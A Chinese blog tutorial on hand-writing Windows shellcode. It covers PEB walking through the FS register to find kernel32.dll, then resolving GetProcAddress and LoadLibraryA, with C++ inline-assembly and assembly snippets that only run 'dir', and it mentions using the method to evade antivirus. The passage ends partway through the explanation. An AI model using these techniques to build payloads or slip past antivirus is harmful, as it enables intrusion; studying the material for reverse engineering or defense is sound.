<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1"><title>shellcode编写指南 | Mssn Harvey</title><meta name="keywords" content="shellcode"><meta name="author" content="Harvey"><meta name="copyright" content="Harvey"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="1.前言linux的shellcode就不用说了，直接通过一个int 0x80系统调用，指定想调用的函数的系统调用号（syscall），传入调用函数的参数，即可，懂的都懂。 在windows中，没有像int 0x80系统调用功能来找相应的函数，但是也有syscall这样的系统调用，过AV奇效，这里主要介绍的是如何手动去通过GetProcAddress去查找某个函数的地址，然后进行调用，这里需要一丢">
<meta property="og:type" content="article">
<meta property="og:title" content="shellcode编写指南">
<meta property="og:url" content="http://example.com/2021/02/24/shellcode%E7%BC%96%E5%86%99%E6%8C%87%E5%8D%97/index.html">
<meta property="og:site_name" content="Mssn Harvey">
<meta property="og:description" content="1.前言linux的shellcode就不用说了，直接通过一个int 0x80系统调用，指定想调用的函数的系统调用号（syscall），传入调用函数的参数，即可，懂的都懂。 在windows中，没有像int 0x80系统调用功能来找相应的函数，但是也有syscall这样的系统调用，过AV奇效，这里主要介绍的是如何手动去通过GetProcAddress去查找某个函数的地址，然后进行调用，这里需要一丢">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/hacker%20(3).png">
<meta property="article:published_time" content="2021-02-24T05:14:20.000Z">
<meta property="article:modified_time" content="2021-03-20T13:48:06.815Z">
<meta property="article:author" content="Harvey">
<meta property="article:tag" content="shellcode">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/hacker%20(3).png"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="http://example.com/2021/02/24/shellcode%E7%BC%96%E5%86%99%E6%8C%87%E5%8D%97/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/node-snackbar/dist/snackbar.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  translate: undefined,
  noticeOutdate: undefined,
  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true},
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '天',
  date_suffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: undefined,
  lightbox: 'mediumZoom',
  Snackbar: {"chs_to_cht":"你已切换为繁体","cht_to_chs":"你已切换为简体","day_to_night":"你已切换为深色模式","night_to_day":"你已切换为浅色模式","bgLight":"#49b1f5","bgDark":"#121212","position":"bottom-left"},
  source: {
    jQuery: 'https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js',
    justifiedGallery: {
      js: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/js/jquery.justifiedGallery.min.js',
      css: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/css/justifiedGallery.min.css'
    },
    fancybox: {
      js: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js',
      css: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.css'
    }
  },
  isPhotoFigcaption: false,
  islazyload: false,
  isanchor: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = { 
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: true,
  postUpdate: '2021-03-20 21:48:06'
}</script><noscript><style type="text/css">
  #nav {
    opacity: 1
  }
  .justified-gallery img {
    opacity: 1
  }

  #recent-posts time,
  #post-meta time {
    display: inline !important
  }
</style></noscript><script>(win=>{
    win.saveToLocal = {
      set: function setWithExpiry(key, value, ttl) {
        if (ttl === 0) return
        const now = new Date()
        const expiryDay = ttl * 86400000
        const item = {
          value: value,
          expiry: now.getTime() + expiryDay,
        }
        localStorage.setItem(key, JSON.stringify(item))
      },

      get: function getWithExpiry(key) {
        const itemStr = localStorage.getItem(key)

        if (!itemStr) {
          return undefined
        }
        const item = JSON.parse(itemStr)
        const now = new Date()

        if (now.getTime() > item.expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return item.value
      }
    }
  
    win.getScript = url => new Promise((resolve, reject) => {
      const script = document.createElement('script')
      script.src = url
      script.async = true
      script.onerror = reject
      script.onload = script.onreadystatechange = function() {
        const loadState = this.readyState
        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
        script.onload = script.onreadystatechange = null
        resolve()
      }
      document.head.appendChild(script)
    })
  
      win.activateDarkMode = function () {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      win.activateLightMode = function () {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }
      const t = saveToLocal.get('theme')
    
          if (t === 'dark') activateDarkMode()
          else if (t === 'light') activateLightMode()
        
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    })(window)</script><meta name="generator" content="Hexo 5.4.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="author-avatar"><img class="avatar-img" src="/img/touxiang.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data"><div class="data-item is-center"><div class="data-item-link"><a href="/archives/"><div class="headline">文章</div><div class="length-num">96</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="/tags/"><div class="headline">标签</div><div class="length-num">66</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="/categories/"><div class="headline">分类</div><div class="length-num">6</div></a></div></div></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><i class="fa-fw fas fa-archive"></i><span> 归档</span><i class="fas fa-chevron-down expand"></i></a><ul class="menus_item_child"><li><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></li><li><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></li><li><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> 生活</span><i class="fas fa-chevron-down expand"></i></a><ul class="menus_item_child"><li><a class="site-page" href="/picture/"><i class="fa-fw fas fa-file-image"></i><span> 图库</span></a></li><li><a class="site-page" href="/movies/"><i class="fa-fw fas fa-video"></i><span> 视频</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/comments/"><i class="fa-fw fas fa-comments"></i><span> 评论</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/hacker%20(3).png')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">Mssn Harvey</a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><i class="fa-fw fas fa-archive"></i><span> 归档</span><i class="fas fa-chevron-down expand"></i></a><ul class="menus_item_child"><li><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></li><li><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></li><li><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> 生活</span><i class="fas fa-chevron-down expand"></i></a><ul class="menus_item_child"><li><a class="site-page" href="/picture/"><i class="fa-fw fas fa-file-image"></i><span> 图库</span></a></li><li><a class="site-page" href="/movies/"><i class="fa-fw fas fa-video"></i><span> 视频</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/comments/"><i class="fa-fw fas fa-comments"></i><span> 评论</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">shellcode编写指南</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2021-02-24T05:14:20.000Z" title="发表于 2021-02-24 13:14:20">2021-02-24</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2021-03-20T13:48:06.815Z" title="更新于 2021-03-20 21:48:06">2021-03-20</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/Gamma%E5%AE%9E%E9%AA%8C%E5%AE%A4/">Gamma实验室</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="1-前言"><a href="#1-前言" class="headerlink" title="1.前言"></a>1.前言</h1><p>linux的shellcode就不用说了，直接通过一个int 0x80系统调用，指定想调用的函数的系统调用号（syscall），传入调用函数的参数，即可，懂的都懂。</p>
<p>在windows中，没有像int 0x80系统调用功能来找相应的函数，但是也有syscall这样的系统调用，过AV奇效，这里主要介绍的是如何手动去通过GetProcAddress去查找某个函数的地址，然后进行调用，这里需要一丢丢c基础和汇编基础。</p>
<h1 id="2-原理"><a href="#2-原理" class="headerlink" title="2.原理"></a>2.原理</h1><p>在windows中，我们需要如下步骤去找到相应的函数，进行调用：</p>
<blockquote>
<p>1）找到PEB表，获取Kernel32.dll base地址<br>2)通过kernel32.dll PE文件格式找到导出表的地址<br>3)通过导出表定位GetProcAddress的RVA<br>4）通过GetProcAddress函数找到LoadLibraryA函数地址<br>5）通过这GetProcAddress和LoadLibraryA两个函数来加载dll文件和查找函数以供使用</p>
</blockquote>
<p>先了解几个基本概念，api函数，动态链接库文件。</p>
<h2 id="2-1-kernel32-dll"><a href="#2-1-kernel32-dll" class="headerlink" title="2.1 kernel32.dll"></a>2.1 kernel32.dll</h2><p>定义：kernel32.dll是windows中非常重要的32位动态链接库文件，工作在ringo，属于内核级文件，它控制着系统的内存管理、数据的输入输出操作和中断处理，当Windows启动时，kernel32.dll就驻留在内存中特定的写保护区域，使别的程序无法占用这个内存区域，提供了954个可供调用api。</p>
<p>$$ 2.2 GetProcAddress</p>
<p>定义：GetProcAddress是一个计算机函数，功能是检索指定的动态链接库(DLL)中的输出库函数地址</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">FARPROC GetProcAddress(</span><br><span class="line">HMODULE hModule, &#x2F;&#x2F; DLL模块句柄，可通过LoadLibrary、AfxLoadLibrary 或者GetModuleHandle函数返回此句柄。</span><br><span class="line">LPCSTR lpProcName &#x2F;&#x2F; 函数名</span><br><span class="line">);</span><br></pre></td></tr></table></figure>

<p>如果函数查找成功，返回值是DLL中的输出函数地址，如果函数调用失败，返回值是NULL</p>
<p>动态链接库DLL的进程会调用GetProcAddress来获取DLL中导出函数的地址。</p>
<h2 id="2-3-LoadLibrary"><a href="#2-3-LoadLibrary" class="headerlink" title="2.3 LoadLibrary"></a>2.3 LoadLibrary</h2><p>将指定的模块加载到调用进程的地址空间中。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">HMODULE LoadLibraryA(  LPCSTR lpLibFileName );&#x2F;&#x2F;模块的名称，可以是库模块（.dll文件）或可执行模块（.exe文件）。</span><br></pre></td></tr></table></figure>

<p>如果函数成功，则返回值是模块的句柄，如果函数失败，则返回值为NULL。</p>
<h2 id="2-4-PE文件格式"><a href="#2-4-PE文件格式" class="headerlink" title="2.4 PE文件格式"></a>2.4 PE文件格式</h2><p>PE文件的全称是Portable Executable，意为可移植的可执行的文件，常见的EXE、DLL、OCX、SYS、COM都是PE文件</p>
<p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/2516431772.png"></p>
<p>不多讲了，一张图就行，PE文件格式内容要说多，专门有一本书来讲PE文件结构，要说简单，一张图就能概括，如果不是为了去写壳，脱壳…….根本不需要知道那么多。</p>
<h2 id="2-5-PEB"><a href="#2-5-PEB" class="headerlink" title="2.5 PEB"></a>2.5 PEB</h2><p>在Windows操作系统中，PEB是一个位于所有进程内存中固定位置的结构体,此结构体包含关于进程的有用信息，如可执行文件加载到内存的位置，模块列表（DLL），指示进程是否被调试的标志，还有许多其他的信息。</p>
<p>微软定义：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">typedef struct _PEB &#123;</span><br><span class="line">  BYTE                          Reserved1[2];</span><br><span class="line">  BYTE                          BeingDebugged;</span><br><span class="line">  BYTE                          Reserved2[1];</span><br><span class="line">  PVOID                         Reserved3[2];</span><br><span class="line">  PPEB_LDR_DATA                 Ldr;&#x2F;&#x2F;偏移4+2*4</span><br><span class="line">  PRTL_USER_PROCESS_PARAMETERS  ProcessParameters;</span><br><span class="line">  PVOID                         Reserved4[3];</span><br><span class="line">  PVOID                         AtlThunkSListPtr;</span><br><span class="line">  PVOID                         Reserved5;</span><br><span class="line">  ULONG                         Reserved6;</span><br><span class="line">  PVOID                         Reserved7;</span><br><span class="line">  ULONG                         Reserved8;</span><br><span class="line">  ULONG                         AtlThunkSListPtr32;</span><br><span class="line">  PVOID                         Reserved9[45];</span><br><span class="line">  BYTE                          Reserved10[96];</span><br><span class="line">  PPS_POST_PROCESS_INIT_ROUTINE PostProcessInitRoutine;</span><br><span class="line">  BYTE                          Reserved11[128];</span><br><span class="line">  PVOID                         Reserved12[1];</span><br><span class="line">  ULONG                         SessionId;</span><br><span class="line">&#125; PEB, *PPEB;</span><br></pre></td></tr></table></figure>

<p>在64位上的定义：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">typedef struct _PEB &#123;</span><br><span class="line">    BYTE Reserved1[2];</span><br><span class="line">    BYTE BeingDebugged;</span><br><span class="line">    BYTE Reserved2[21];</span><br><span class="line">    PPEB_LDR_DATA LoaderData;</span><br><span class="line">    PRTL_USER_PROCESS_PARAMETERS ProcessParameters;</span><br><span class="line">    BYTE Reserved3[520];</span><br><span class="line">    PPS_POST_PROCESS_INIT_ROUTINE PostProcessInitRoutine;</span><br><span class="line">    BYTE Reserved4[136];</span><br><span class="line">    ULONG SessionId;</span><br><span class="line">&#125; PEB;</span><br></pre></td></tr></table></figure>

<p>我们重点关注结构体PEB_LDR_DATA里面的内容，包含如下信息(该结构包含有关进程的已加载模块的信息)：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">typedef struct _PEB_LDR_DATA &#123;</span><br><span class="line">  BYTE       Reserved1[8];&#x2F;&#x2F;保留供操作系统内部使用。</span><br><span class="line">  PVOID      Reserved2[3];&#x2F;&#x2F;保留供操作系统内部使用</span><br><span class="line">  LIST_ENTRY InMemoryOrderModuleList;&#x2F;&#x2F;双向链接列表的头部，该列表包含该过程的已加载模块。列表中的每个项目都是指向LDR_DATA_TABLE_ENTRY结构的指针,偏移为8+3x4</span><br><span class="line">&#125; PEB_LDR_DATA, *PPEB_LDR_DATA;</span><br></pre></td></tr></table></figure>

<p>LIST_ENTRY结构是一个简单的双向链表，包含指向下一个元素（Flink）的指针和指向上一个元素的指针（Blink）</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">typedef struct _LIST_ENTRY &#123;</span><br><span class="line">   struct _LIST_ENTRY *Flink;</span><br><span class="line">   struct _LIST_ENTRY *Blink;</span><br><span class="line">&#125; LIST_ENTRY, *PLIST_ENTRY, *RESTRICTED_POINTER PRLIST_ENTRY;</span><br></pre></td></tr></table></figure>

<p>我们需要通过LDR_DATA_TABLE_ENTRY结构体来获取已加载DLL的信息结构体为：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">typedef struct _LDR_DATA_TABLE_ENTRY</span><br><span class="line">&#123;</span><br><span class="line">    LIST_ENTRY InLoadOrderLinks; &#x2F;* 0x00 *&#x2F;</span><br><span class="line">    LIST_ENTRY InMemoryOrderLinks; &#x2F;* 0x08，这里是Flink指向的地方 *&#x2F; </span><br><span class="line">    LIST_ENTRY InInitializationOrderLinks; &#x2F;* 0x10 *&#x2F;</span><br><span class="line">    PVOID DllBase; &#x2F;* 0x18 *&#x2F;</span><br><span class="line">    PVOID EntryPoint;</span><br><span class="line">    ULONG SizeOfImage;</span><br><span class="line">    UNICODE_STRING FullDllName; &#x2F;* 0x24 *&#x2F;</span><br><span class="line">    UNICODE_STRING BaseDllName; &#x2F;* 0x28 *&#x2F;</span><br><span class="line">    ULONG Flags;</span><br><span class="line">    WORD LoadCount;</span><br><span class="line">    WORD TlsIndex;</span><br><span class="line">    union</span><br><span class="line">    &#123;</span><br><span class="line">         LIST_ENTRY HashLinks;</span><br><span class="line">         struct</span><br><span class="line">         &#123;</span><br><span class="line">              PVOID SectionPointer;</span><br><span class="line">              ULONG CheckSum;</span><br><span class="line">         &#125;;</span><br><span class="line">    &#125;;</span><br><span class="line">    union</span><br><span class="line">    &#123;</span><br><span class="line">         ULONG TimeDateStamp;</span><br><span class="line">         PVOID LoadedImports;</span><br><span class="line">    &#125;;</span><br><span class="line">    _ACTIVATION_CONTEXT * EntryPointActivationContext;</span><br><span class="line">    PVOID PatchInformation;</span><br><span class="line">    LIST_ENTRY ForwarderLinks;</span><br><span class="line">    LIST_ENTRY ServiceTagLinks;</span><br><span class="line">    LIST_ENTRY StaticLinks;</span><br><span class="line">&#125; LDR_DATA_TABLE_ENTRY, *PLDR_DATA_TABLE_ENTRY;</span><br></pre></td></tr></table></figure>

<p>InMemoryOrderModuleList字段是一个指针，指向LDR_DATA_TABLE_ENTRY 结构体上的LIST_ENTRY字段，但是它不是指向LDR_DATA_TABLE_ENTRY 起始位置的指针，而是指向这个结构的InMemoryOrderLinks字段。</p>
<h1 id="3-编写shellcode"><a href="#3-编写shellcode" class="headerlink" title="3.编写shellcode"></a>3.编写shellcode</h1><h2 id="3-1-c-库文件配合内联汇编"><a href="#3-1-c-库文件配合内联汇编" class="headerlink" title="3.1 c++库文件配合内联汇编"></a>3.1 c++库文件配合内联汇编</h2><p>先来针对指定系统的shellcode的编写，指定系统的,我们首先通过LoadLibraryA函数导入相应的dll文件，获得一个dll句柄，在把这个dll句柄当作参数传入GetProcAddress 搜索查找指定函数，返回该函数的地址，然后通过函数的地址来调用函数，用c++代码内联汇编实现</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">#include&lt;Windows.h&gt;</span><br><span class="line">#include&lt;iostream&gt;</span><br><span class="line">#include&lt;string.h&gt;</span><br><span class="line">using namespace std;</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">  string cmd &#x3D; &quot;dir&quot;;</span><br><span class="line">  HINSTANCE Libhandle &#x3D; LoadLibraryA(&quot;msvcrt.dll&quot;); &#x2F;&#x2F;加载dll文件</span><br><span class="line">  if (Libhandle &#x3D;&#x3D; NULL)</span><br><span class="line">  &#123;</span><br><span class="line">    return 0;</span><br><span class="line">  &#125;</span><br><span class="line">  &#x2F;&#x2F;system(&quot;dir&quot;);</span><br><span class="line">  cout &lt;&lt;&quot;msvcrt Address &#x3D; &quot;&lt;&lt; Libhandle &lt;&lt; endl;</span><br><span class="line">  LPTSTR getaddr &#x3D; (LPTSTR)GetProcAddress(Libhandle, &quot;system&quot;);&#x2F;&#x2F;获得system函数的地址</span><br><span class="line">  cout &lt;&lt; &quot;system Address &#x3D; &quot; &lt;&lt; getaddr &lt;&lt; endl;</span><br><span class="line">  &#x2F;&#x2F;通过汇编代码来调用函数</span><br><span class="line">    _asm&#123;</span><br><span class="line">            &#x2F;&#x2F;system(&quot;dir&quot;); &#x2F;&#x2F;64 69 72</span><br><span class="line">            pushad</span><br><span class="line">            pushfd</span><br><span class="line">            xor ebx, ebx</span><br><span class="line"></span><br><span class="line">            mov ebx,0x726964  ;这里需要注意数据入栈的顺序</span><br><span class="line">            push ebx</span><br><span class="line"></span><br><span class="line">            push esp</span><br><span class="line"></span><br><span class="line">            mov ebx, getaddr</span><br><span class="line">            call ebx</span><br><span class="line"></span><br><span class="line">            add esp,8</span><br><span class="line"></span><br><span class="line">            popfd</span><br><span class="line">            popad</span><br><span class="line">    &#125;</span><br><span class="line">  return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>会得到这个效果</p>
<p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/3148187291.jpg"></p>
<p>但是这是c++代码去加载相应头文件，直接调用LoadLibraryA来加载，具有局限性，无法移植的shellcode，且那段内联汇编代码必须在导入相应链接库得情况才能执行，不然会报错。</p>
<p>这里补充一点知识：</p>
<blockquote>
<p>其实程序最开始加载并不是从main函数的，main函数也是别的函数调用执行的。</p>
<p>1.首先操作系统必须的创建进程，然后jmp到这个进程的入口函数</p>
<p>2.然后经过一系列的初始化</p>
<p>3.完成初始化之后，调用main函数，开始执行程序主体。</p>
</blockquote>
<p>所以说，我们这里我们直接用BinaryNinja打开，找到可执行文件的入口点并不是main函数入口点</p>
<p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/4120466773.jpg"></p>
<p>他会先从初始化函数开始（这里是编译器给我加的）,一直执行到我们mian函数</p>
<h2 id="3-2-从PEB表查找LoadLibraryA，GetProcAddress"><a href="#3-2-从PEB表查找LoadLibraryA，GetProcAddress" class="headerlink" title="3.2 从PEB表查找LoadLibraryA，GetProcAddress"></a>3.2 从PEB表查找LoadLibraryA，GetProcAddress</h2><p>在上面讲了，虽然我们通过c++库拿到了LoadLibraryA和GetProcAddress函数，但是在实际的情况下并不实用，因为实际情况下并没有c++库给我们调用，所以这时候就体现了PEB表的优势在，因为PEB表是位于所有进程内存中固定位置的结构体，所以我们在任意进程里都能找到PEB表，通过PEB表找到kernel32.dll，从Kernel32.dll中找到LoadLibraryA，和GetProcAddress这个两个函数，这样就解决了可移植性的问题。</p>
<p>这里首先还得了解一个非常重要的概念，FS段寄存器，在我们介绍Kernel32.dll时候，说了工作在ringo，属于内核级文件，与之相对应的User32.dll 工作在ring3，属于用户级文件，这里就涉及了内核态和用户态，不讲深了，你只需要知道我们的程序虽然在用户层里运行，但是有时候也需要切换到内核状态。</p>
<p>而FS寄存器的改变，就意味着程序在R3和R0之间进行切换（都是在R0下给FS赋不同值的），在R3下：FS段寄存器的值是0x3B,在R0下：FS段寄存器的值是0x30，注意这里0x30和0x3B 是代表指向GDT表中的不同段。</p>
<blockquote>
<p>当运行在R3下时,FS指向的段是GDT中的0x3B段.该段的长度为4K,基地址为当前线程的线程环境块（TEB），所以该段也被称为“TEB段”<br>当运行在R0下时, FS指向的段是GDT中的0x30段.该段的长度也为4K,基地址为0xFFDFF000.该地址指向系统的处理器控制区域（KPCR）</p>
</blockquote>
<p><strong>从以上可得知，我们如何去找PEB的基地址？</strong></p>
<p>在R3状态下的FS寄存器存的值就是PEB表基地址，加上偏移量0X30，就得到了PEB的地址，上汇编代码。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mov eax,fs:[ecx + 0x30];PEB</span><br></pre></td></tr></table></figure>

<p>找到了PEB表，然后通过PEB加上偏移0xC得到PPEB_LDR_DATA [Ldr]结构体的地址</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mov eax, [eax + 0xc] ;PEB-&gt;Ldr</span><br></pre></td></tr></table></figure>

<p>再偏移0x14，找到InMemoryOrderLinks</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mov esi,[eax+0x14];PEB-&gt;Ldr-&gt;InMemoryOrderModuleList</span><br></pre></td></tr></table></figure>

<p>现在我们的寄存器放的值就是InMemoryOrderModuleList地址哟，但是我们想要的kernel32.dll处于第三个模块（固定位置，第三），我们前面讲了在LIST_ENTRY结构体中，可以通过Flink和Blink指针进行模块的切换，而InMemoryOrderModuleList便是LIST_ENTRY结构体指针，而InMemoryOrderModuleList指向的就是LIST_ENTRY结构体中的InMemoryOrderLinks（Flink指针）字段，我们通过InMemoryOrderLinks（Flink指针）字段来遍历到Kernel32.dll模块。</p>
<blockquote>
<p>lodsd指令：会把esi寄存器指向的地址读取双字，然后把结果存放在eax寄存器<br>xchg指令：交换寄存器中的值</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">lodsd; 读取第二个模块的地址</span><br><span class="line">xchg eax,esi</span><br><span class="line">lodsd;读取第三模块的地址</span><br><span class="line">mov ebx,[eax+0x10];获得kernel32.dllbase地址</span><br><span class="line">push ebx</span><br></pre></td></tr></table></figure>

<p>因为InMemoryOrderLinks在LIST_ENTRY偏移为0x8,而dllbase为0x18，所以InMemoryOrderLinks到dllbase只需要偏移0x10,这里我们就找到了kernel32.dll base地址。</p>
<p><strong>如何通过kernel32.dll地址找到 GetProcAddress函数地址？</strong></p>
<p>这里需要解析kernel32.DLL文件的PE头找到导出表(前面就说了，dll文件也是PE文件格式)，需要找到PE头，在PE文件结构中，是用IMAGE_DOS_HEADER结构体来定义DOS文件头</p>
